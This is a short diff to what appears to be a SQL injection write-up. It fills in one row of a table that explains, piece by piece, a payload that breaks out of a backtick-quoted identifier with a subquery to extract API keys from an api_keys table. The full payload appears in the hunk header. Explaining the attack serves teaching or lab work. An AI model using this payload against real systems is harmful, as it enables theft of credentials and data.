@@ -420,7 +420,7 @@ scan_id=x`+FROM+(SELECT+api_key+AS+`'x`+FROM+api_keys)y;--+-
 | --- | --- |
 | `X` | Dummy value |
 | `` ` `` | Closes the original backtick in the query |
-| `FROM (...)y` |  |
+| `FROM (...)y` | Creates a subquery that returns the data we want to extract |
 | `` `SELECT api_key AS 'x` `` | Selects api_key and names it `'x` |
 | `;` | Ends the statement |
 | `-+-` | Comments out the rest |
